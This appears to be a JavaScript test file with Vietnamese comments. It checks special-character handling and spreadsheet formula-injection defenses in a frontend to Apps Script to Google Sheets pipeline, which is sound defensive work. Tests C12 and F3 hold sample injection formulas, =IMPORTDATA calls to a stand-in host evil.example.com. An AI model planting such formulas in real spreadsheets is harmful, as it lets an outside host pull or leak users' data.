/**
 * test-special-chars.js
 * Kiểm tra toàn diện xử lý ký tự đặc biệt trong vòng lặp FE → GAS → Sheets.
 *
 * Test coverage:
 *   A. FE encoding chain (api.js logic)
 *   B. GAS sanitizeStr_ (null byte, CRLF, lone surrogate, formula prefix)
 *   C. GAS toSheetValue_ (formula injection protection)
 *   D. JSON_Backup cell size limit
 *   E. form-mapper.js CRLF normalization
 *   F. End-to-end: Prompt_Context field với nhiều loại special chars
 *
 * Chạy: node assets/tests/test-special-chars.js
 */

'use strict';

// ── Test runner ───────────────────────────────────────────────────────────────
var passed = 0;
var failed = 0;
function assert(label, condition) {
  if (condition) {
    console.log('  ✅ ' + label);
    passed++;
  } else {
    console.error('  ❌ FAIL: ' + label);
    failed++;
  }
}
function assertEqual(label, actual, expected) {
  var ok = actual === expected;
  if (!ok) console.error('     Got:      ' + JSON.stringify(actual));
  if (!ok) console.error('     Expected: ' + JSON.stringify(expected));
  assert(label, ok);
}
function section(name) { console.log('\n── ' + name + ' ──'); }

// ── A. FE encoding chain (tái hiện api.js _request logic) ─────────────────────
section('A. FE encoding chain (api.js)');

function feEncode(data) {
  // Strip lone surrogates — giữ surrogate pair hợp lệ (emoji), strip lone surrogate
  var safeData = JSON.parse(JSON.stringify(data, function(k, v) {
    if (typeof v === 'string') {
      return v.replace(/([\uD800-\uDBFF][\uDC00-\uDFFF])|[\uD800-\uDFFF]/g, function(m, pair) {
        return pair || '';
      });
    }
    return v;
  }));
  var json    = JSON.stringify(safeData);
  var b64     = Buffer.from(json, 'utf8').toString('base64');
  var payload = b64.replace(/\+/g, '-').replace(/\//g, '_').replace(/=/g, '');
  return { payload: payload, json: json };
}

function gasDecode(payloadParam) {
  // Tái hiện decodePayload_ GAS
  var b64 = payloadParam.replace(/-/g, '+').replace(/_/g, '/');
  while (b64.length % 4 !== 0) b64 += '=';
  var buf = Buffer.from(b64, 'base64');
  var str = buf.toString('utf8');
  return JSON.parse(str);
}

// A1. Tiếng Việt cơ bản
(function() {
  var data = { Prompt_Context: 'Đây là ngữ cảnh tiếng Việt với dấu: ảằặắạẩẫẻẽỉỵ' };
  var enc  = feEncode(data);
  var dec  = gasDecode(enc.payload);
  assertEqual('A1. Tiếng Việt roundtrip', dec.Prompt_Context, data.Prompt_Context);
})();

// A2. Double quotes
(function() {
  var data = { Prompt_Context: 'Context: "đây là quote" và \'single\'' };
  var enc  = feEncode(data);
  var dec  = gasDecode(enc.payload);
  assertEqual('A2. Double + single quotes roundtrip', dec.Prompt_Context, data.Prompt_Context);
})();

// A3. Backslash
(function() {
  var data = { Prompt_Context: 'Đường dẫn: C:\\Users\\LENOVO\\Desktop\\file.txt' };
  var enc  = feEncode(data);
  var dec  = gasDecode(enc.payload);
  assertEqual('A3. Backslash roundtrip', dec.Prompt_Context, data.Prompt_Context);
})();

// A4. Newlines (LF)
(function() {
  var data = { Prompt_Context: 'Dòng 1\nDòng 2\nDòng 3' };
  var enc  = feEncode(data);
  var dec  = gasDecode(enc.payload);
  assertEqual('A4. Newline (LF) roundtrip', dec.Prompt_Context, data.Prompt_Context);
})();

// A5. Markdown syntax (phổ biến trong AI prompts)
(function() {
  var data = { Prompt_Context: '**Bold**, _italic_, ### Header\n- Bullet 1\n- Bullet 2\n```code block```' };
  var enc  = feEncode(data);
  var dec  = gasDecode(enc.payload);
  assertEqual('A5. Markdown syntax roundtrip', dec.Prompt_Context, data.Prompt_Context);
})();

// A6. Template variables (phổ biến trong prompts)
(function() {
  var data = { Prompt_Context: 'Hãy phân tích {{input_data}} theo tiêu chí [criterion] và trả về <JSON_FORMAT>' };
  var enc  = feEncode(data);
  var dec  = gasDecode(enc.payload);
  assertEqual('A6. Template vars {{}} [] <> roundtrip', dec.Prompt_Context, data.Prompt_Context);
})();

// A7. URL trong nội dung
(function() {
  var data = { Prompt_Context: 'Tham khảo: https://example.com/api?param=value&other=123#anchor' };
  var enc  = feEncode(data);
  var dec  = gasDecode(enc.payload);
  assertEqual('A7. URL với & và ? roundtrip', dec.Prompt_Context, data.Prompt_Context);
})();

// A8. Percent sign
(function() {
  var data = { Prompt_Context: 'Tỷ lệ: 80% chính xác, giảm 50% thời gian xử lý' };
  var enc  = feEncode(data);
  var dec  = gasDecode(enc.payload);
  assertEqual('A8. Percent sign (%) roundtrip', dec.Prompt_Context, data.Prompt_Context);
})();

// A9. JSON-like content trong prompt
(function() {
  var data = { Prompt_Context: 'Output format:\n{"name": "value", "list": [1, 2, 3], "nested": {"key": true}}' };
  var enc  = feEncode(data);
  var dec  = gasDecode(enc.payload);
  assertEqual('A9. JSON-like content trong prompt roundtrip', dec.Prompt_Context, data.Prompt_Context);
})();

// A10. Emoji và ký hiệu đặc biệt
(function() {
  var data = { Prompt_Context: 'Kết quả tốt: ✅ | Kết quả tệ: ❌ | Note: 🎯 Mục tiêu chính' };
  var enc  = feEncode(data);
  var dec  = gasDecode(enc.payload);
  assertEqual('A10. Emoji và ký hiệu roundtrip', dec.Prompt_Context, data.Prompt_Context);
})();

// A11. Lone surrogate bị strip, surrogate pair (emoji) KHÔNG bị strip
(function() {
  // \uDBFF là lone high surrogate (không có low surrogate theo sau) → bị strip
  // 𐀀 = U+10000 = surrogate pair 𐀀 → giữ nguyên
  var raw  = { Prompt_Context: 'Text với lone surrogate: 𐀀 và \uDBFF end' };
  var enc  = feEncode(raw);
  var dec  = gasDecode(enc.payload);
  assert('A11a. Lone surrogate \\uDBFF bị strip',
    !dec.Prompt_Context.includes('\uDBFF')
  );
  assert('A11b. Surrogate pair hợp lệ 𐀀 (U+10000) được giữ nguyên',
    dec.Prompt_Context.includes('𐀀')
  );
  assert('A11c. Nội dung còn lại đúng',
    dec.Prompt_Context.includes('Text với lone surrogate') &&
    dec.Prompt_Context.includes('end')
  );
})();

// A12. Không throw với các ký tự phức tạp
(function() {
  var data = { Prompt_Context: 'Toán: ∑(x²) ≥ 0, ∆x → 0, α·β = γ, 中文, العربية, Ελληνικά' };
  var ok = true;
  try {
    var enc = feEncode(data);
    var dec = gasDecode(enc.payload);
    if (dec.Prompt_Context !== data.Prompt_Context) ok = false;
  } catch(e) { ok = false; }
  assert('A12. Nhiều script khác nhau không throw', ok);
})();

// A13. Form đầy với payload lớn — không vượt 50,000 chars limit
(function() {
  var longText = 'A'.repeat(2000); // 2000 chars per field
  var data = {};
  ['Prompt_Role', 'Prompt_Task', 'Prompt_Goal', 'Prompt_Context',
   'Prompt_Input', 'Prompt_Steps', 'Prompt_Output_Format', 'Prompt_Evaluation',
   'Pain_Point', 'Current_Process', 'Flow_Description'].forEach(function(f) {
    data[f] = longText;
  });
  var enc = feEncode(data);
  assert('A13. Payload với 11 field × 2000 chars < 50,000 chars limit',
    enc.payload.length < 50000
  );
})();

// ── B. GAS sanitizeStr_ (tái hiện trong Node.js) ───────────────────────────
section('B. GAS sanitizeStr_ equivalents');

function sanitizeStr_(val, maxLen) {
  if (val === null || val === undefined) return '';
  var s = String(val).trim();
  s = s.replace(/\0/g, '');
  // Strip lone surrogates — giữ surrogate pair hợp lệ (emoji)
  s = s.replace(/([\uD800-\uDBFF][\uDC00-\uDFFF])|[\uD800-\uDFFF]/g, function(m, pair) {
    return pair || '';
  });
  s = s.replace(/\r\n/g, '\n').replace(/\r/g, '\n');
  if (maxLen && s.length > maxLen) s = s.substring(0, maxLen);
  return s;
}

assertEqual('B1. Null được trả về chuỗi rỗng',    sanitizeStr_(null),      '');
assertEqual('B2. Undefined được trả về chuỗi rỗng', sanitizeStr_(undefined), '');
assertEqual('B3. Trim leading/trailing spaces',    sanitizeStr_('  hello  '), 'hello');
assertEqual('B4. Strip null byte \\0',             sanitizeStr_('a\0b\0c'), 'abc');
assertEqual('B5. Strip lone surrogate \\uD800',    sanitizeStr_('test\uD800text'), 'testtext');
assertEqual('B5b. Emoji (surrogate pair) không bị strip', sanitizeStr_('🎯 text 🎯'), '🎯 text 🎯');
assertEqual('B6. CRLF → LF',                       sanitizeStr_('line1\r\nline2\r\nline3'), 'line1\nline2\nline3');
assertEqual('B7. Lone \\r → LF',                   sanitizeStr_('line1\rline2'), 'line1\nline2');
assertEqual('B8. Giới hạn maxLen',                  sanitizeStr_('abcdef', 3), 'abc');
assertEqual('B9. Tiếng Việt không bị strip',        sanitizeStr_('Đây là tiếng Việt ảằặ'), 'Đây là tiếng Việt ảằặ');
assertEqual('B10. Ký tự đặc biệt thông thường giữ nguyên',
  sanitizeStr_('=formula &amp; "quotes" #hash @mention'),
  '=formula &amp; "quotes" #hash @mention'
);

// ── C. GAS toSheetValue_ (formula injection protection) ────────────────────
section('C. GAS toSheetValue_ (formula injection protection)');

function toSheetValue_(val) {
  if (typeof val !== 'string') return val;
  if (/^[=+\-@|]/.test(val)) return "'" + val;
  return val;
}

assertEqual('C1. = formula gets apostrophe prefix',   toSheetValue_('=SUM(A1:A10)'), "'=SUM(A1:A10)");
assertEqual('C2. + prefix gets apostrophe',            toSheetValue_('+100%'),        "'+100%");
assertEqual('C3. - prefix gets apostrophe',            toSheetValue_('-10'),           "'-10");
assertEqual('C4. @ prefix gets apostrophe',            toSheetValue_('@mention'),      "'@mention");
assertEqual('C5. | prefix gets apostrophe',            toSheetValue_('|table|'),       "'|table|");
assertEqual('C6. Normal text unchanged',               toSheetValue_('hello world'),   'hello world');
assertEqual('C7. Tiếng Việt unchanged',                toSheetValue_('Đây là text'),   'Đây là text');
assertEqual('C8. Non-string unchanged',                toSheetValue_(123),             123);
assertEqual('C9. Empty string unchanged',              toSheetValue_(''),              '');
assertEqual('C10. = inside string (not at start) OK',  toSheetValue_('a=b'),           'a=b');
assertEqual('C11. Prompt_Context không bắt đầu = OK',
  toSheetValue_('Đây là ngữ cảnh với =formula ở giữa'),
  'Đây là ngữ cảnh với =formula ở giữa'
);
// Kết hợp: sanitize trước, rồi toSheetValue_
(function() {
  var raw = '  =IMPORTDATA("http://evil.example.com/")  \r\n';
  var sanitized = sanitizeStr_(raw);
  var sheetVal  = toSheetValue_(sanitized);
  assertEqual('C12. Kết hợp sanitize + toSheetValue_: =formula bị prefix',
    sheetVal, "'=IMPORTDATA(\"http://evil.example.com/\")"
  );
})();

// ── D. JSON_Backup cell size limit ────────────────────────────────────────────
section('D. JSON_Backup cell size limit (Google Sheets 50,000 chars/cell)');

function buildJsonBackup(fields) {
  var backupStr = JSON.stringify(fields);
  return backupStr.length <= 45000 ? backupStr : '';
}

// D1. Bình thường
(function() {
  var data = { UseCase_Name: 'Test', Prompt_Context: 'Short context' };
  var result = buildJsonBackup(data);
  assert('D1. Backup ngắn được giữ nguyên', result.length > 0);
})();

// D2. Quá lớn — bị clear
(function() {
  var data = {};
  for (var i = 0; i < 10; i++) data['field_' + i] = 'A'.repeat(5000);
  var result = buildJsonBackup(data);
  assertEqual('D2. Backup > 45,000 chars → trả về rỗng để tránh Sheets fail', result, '');
})();

// D3. Đúng ngưỡng 45,000
(function() {
  var longData = { field: 'A'.repeat(44000) };
  var result = buildJsonBackup(longData);
  assert('D3. Backup < 45,000 chars vẫn được lưu', result.length > 0);
})();

// ── E. form-mapper.js CRLF normalization ─────────────────────────────────────
section('E. form-mapper.js CRLF normalization');

function normalizeCRLF(val) {
  return val.replace(/\r\n/g, '\n').replace(/\r/g, '\n');
}

assertEqual('E1. CRLF → LF',             normalizeCRLF('line1\r\nline2'), 'line1\nline2');
assertEqual('E2. Lone CR → LF',          normalizeCRLF('line1\rline2'),   'line1\nline2');
assertEqual('E3. Mixed CRLF + CR → LF',  normalizeCRLF('a\r\nb\rc'),     'a\nb\nc');
assertEqual('E4. LF không thay đổi',     normalizeCRLF('line1\nline2'),   'line1\nline2');
assertEqual('E5. Không có newline OK',    normalizeCRLF('simple text'),    'simple text');
assertEqual('E6. Tiếng Việt + CRLF',
  normalizeCRLF('Dòng 1: Ký tự đặc biệt ảằặ\r\nDòng 2: tiếp theo'),
  'Dòng 1: Ký tự đặc biệt ảằặ\nDòng 2: tiếp theo'
);

// ── F. End-to-end: Prompt_Context field với nhiều loại special chars ──────────
section('F. End-to-end Prompt_Context scenarios');

function e2e(promptContextValue) {
  // FE: normalize CRLF (form-mapper)
  var normalized = promptContextValue.replace(/\r\n/g, '\n').replace(/\r/g, '\n');
  var data = { Prompt_Context: normalized };

  // FE: encode (api.js) — strip lone surrogates, giữ surrogate pair (emoji)
  var encoded;
  try {
    var safeData = JSON.parse(JSON.stringify(data, function(k, v) {
      if (typeof v === 'string') {
        return v.replace(/([\uD800-\uDBFF][\uDC00-\uDFFF])|[\uD800-\uDFFF]/g, function(m, pair) {
          return pair || '';
        });
      }
      return v;
    }));
    var json    = JSON.stringify(safeData);
    var b64     = Buffer.from(json, 'utf8').toString('base64');
    encoded     = b64.replace(/\+/g, '-').replace(/\//g, '_').replace(/=/g, '');
  } catch(e) {
    return { ok: false, error: e.message };
  }

  // GAS: decode
  var decoded;
  try {
    var b64 = encoded.replace(/-/g, '+').replace(/_/g, '/');
    while (b64.length % 4 !== 0) b64 += '=';
    decoded = JSON.parse(Buffer.from(b64, 'base64').toString('utf8'));
  } catch(e) {
    return { ok: false, error: 'GAS decode: ' + e.message };
  }

  // GAS: sanitize
  var sanitized = sanitizeStr_(decoded.Prompt_Context, 5000);

  // GAS: toSheetValue
  var sheetVal = toSheetValue_(sanitized);

  return { ok: true, sheetVal: sheetVal, sanitized: sanitized };
}

// F1. Prompt thông thường đầy đủ
(function() {
  var r = e2e('Bạn là chuyên gia phân tích AI với 10 năm kinh nghiệm.\nHãy phân tích use case theo tiêu chí: Tính khả thi, ROI, Rủi ro.\nOutput dạng JSON: {"score": 0-10, "comment": "..."}');
  assert('F1. Prompt đầy đủ tiếng Việt + JSON format', r.ok && r.sanitized.includes('phân tích'));
})();

// F2. Windows CRLF clipboard paste
(function() {
  var r = e2e('Bước 1: Copy nội dung\r\nBước 2: Phân tích\r\nBước 3: Tổng hợp');
  assert('F2. Windows CRLF → LF sau pipeline', r.ok && !r.sanitized.includes('\r'));
  assertEqual('F2b. CRLF được normalize', r.sanitized, 'Bước 1: Copy nội dung\nBước 2: Phân tích\nBước 3: Tổng hợp');
})();

// F3. Context bắt đầu bằng = (formula injection)
(function() {
  var r = e2e('=IMPORTDATA("http://evil.example.com/data")');
  assert('F3. Context bắt đầu = bị prefix với apostrophe', r.ok && r.sheetVal.startsWith("'="));
  assert('F3b. Nội dung gốc vẫn đúng (không mất data)', r.sanitized === '=IMPORTDATA("http://evil.example.com/data")');
})();

// F4. Context với backslash (đường dẫn Windows)
(function() {
  var r = e2e('Nguồn dữ liệu: C:\\Data\\Reports\\Q4_2025.xlsx hoặc D:\\Archive\\backup.zip');
  assert('F4. Backslash trong đường dẫn Windows', r.ok && r.sanitized.includes('C:\\Data'));
})();

// F5. Context với nhiều ký tự đặc biệt kết hợp
(function() {
  var r = e2e('# System prompt\n\n**Context:** Đây là "ngữ cảnh" với:\n- Ký tự: <HTML>, {JSON}, [Array], (tuple)\n- Toán: 50% ≥ threshold & score > 0.8\n- Code: `print("hello world")`\n- URL: https://api.example.com?q=test&limit=10#section');
  assert('F5. Nhiều ký tự đặc biệt kết hợp không throw', r.ok);
  assert('F5b. Nội dung giữ nguyên sau pipeline', r.sanitized.includes('ngữ cảnh'));
})();

// F6. Null byte bị strip
(function() {
  var r = e2e('Context với null byte: \0abc\0def');
  assert('F6. Null byte bị strip', r.ok && !r.sanitized.includes('\0'));
  assert('F6b. Nội dung còn lại đúng', r.sanitized === 'Context với null byte: abcdef');
})();

// F7. Chuỗi rỗng
(function() {
  var r = e2e('');
  assert('F7. Chuỗi rỗng không gây lỗi', r.ok);
  assertEqual('F7b. Kết quả là chuỗi rỗng', r.sanitized, '');
})();

// F8. Text rất dài (> 5000 chars) bị truncate bởi maxLen
(function() {
  var r = e2e('A'.repeat(6000));
  assert('F8. Text > 5000 chars bị truncate tại GAS', r.ok && r.sanitized.length === 5000);
})();

// F9. Emoji trong prompt
(function() {
  var r = e2e('🎯 Mục tiêu: Phân tích 📊 dữ liệu và tổng hợp 📝 báo cáo\n✅ Kết quả tốt | ❌ Kết quả tệ');
  assert('F9. Emoji không gây lỗi encode/decode', r.ok && r.sanitized.includes('🎯'));
})();

// F10. Prompt với backtick (code block style)
(function() {
  var r = e2e('Hãy phân tích code sau:\n```python\ndef analyze(data):\n    return {"score": len(data) / 100}\n```\nVà cho biết kết quả.');
  assert('F10. Backtick và code block', r.ok && r.sanitized.includes('```python'));
})();

// ── Kết quả ───────────────────────────────────────────────────────────────────
console.log('\n' + '═'.repeat(60));
console.log('Kết quả: ' + passed + ' passed, ' + failed + ' failed');
if (failed > 0) {
  console.error('❌ Có ' + failed + ' test thất bại!');
  process.exit(1);
} else {
  console.log('✅ Tất cả ' + passed + ' test đều PASS');
  process.exit(0);
}
